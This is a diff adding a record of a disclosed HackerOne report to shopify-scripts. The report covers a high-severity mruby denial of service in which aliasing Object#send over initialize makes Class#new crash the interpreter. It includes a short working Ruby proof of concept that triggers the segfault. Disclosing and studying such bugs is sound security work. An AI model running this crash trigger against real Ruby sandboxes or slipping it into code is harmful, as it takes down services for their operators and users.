@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/183425
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/charliesome
+ReportedTo:shopify-scripts(shopify-scripts)
+BountyAmount:8000.0
+Severity:high
+State:Closed
+DateOfDisclosure:13.04.2017 21:07:57
+
+Summary:
+
+We can arrange for C to call `Object#send` by aliasing it over `initialize`. This will cause `Class#new` (a C function) to call `#initialize` (which is actually `Object#send`) with arbitrary arguments.
+
+If we invoke a Ruby method through `Object#send`, mruby segfaults:
+
+```
+def foo
+end
+
+class X
+  alias_method :initialize, :send
+end
+
+X.new.send(:foo)
+```
